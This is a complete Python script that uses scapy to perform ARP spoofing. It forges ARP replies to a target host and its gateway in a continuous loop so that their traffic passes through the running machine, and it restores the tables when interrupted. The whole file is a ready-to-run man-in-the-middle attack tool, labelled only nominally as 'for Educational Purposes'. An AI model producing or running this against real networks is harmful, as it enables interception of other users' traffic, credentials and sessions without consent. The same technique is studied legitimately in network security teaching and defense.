import argparse
import time
from scapy.all import ARP, Ether, send, srp

# Function to perform ARP spoofing
def arp_spoof(target_ip, gateway_ip, interface):
    # Crafting the ARP response packet to trick the target into thinking
    # this machine's MAC is the gateway's MAC address.
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    print(f"[*] Target MAC: {target_mac}")
    print(f"[*] Gateway MAC: {gateway_mac}")

    # Infinite loop to send ARP responses
    while True:
        # Send fake ARP reply (target thinks our MAC is the gateway)
        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, verbose=False)
        # Send another fake ARP reply to the gateway (gateway thinks our MAC is the target)
        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, verbose=False)
        print(f"[*] Sent ARP spoof to target {target_ip} and gateway {gateway_ip}")
        time.sleep(2)

# Function to get MAC address from an IP address
def get_mac(ip):
    # Send ARP request to get the MAC address for the IP
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    # Return the MAC address
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] Failed to get MAC address for {ip}")
        return None

# Function to restore the network to its original state
def restore_network(target_ip, gateway_ip, target_mac, gateway_mac, interface):
    print("[*] Restoring network...")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, count=5, verbose=False)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, count=5, verbose=False)
    print("[*] Network restored.")

# Main function to parse arguments and run ARP spoofing
def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for Educational Purposes")
    parser.add_argument("-t", "--target", required=True, help="Target IP Address")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address")
    parser.add_argument("interface", help="Network Interface (e.g., eth0, wlan0)")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    interface = args.interface

    print(f"[*] Starting ARP Spoofing on interface {interface}")
    try:
        arp_spoof(target_ip, gateway_ip, interface)
    except KeyboardInterrupt:
        print("\n[!] Stopping ARP spoofing...")
        restore_network(target_ip, gateway_ip, get_mac(target_ip), get_mac(gateway_ip), interface)
        print("[*] Exiting the program...")

if __name__ == "__main__":
    main()
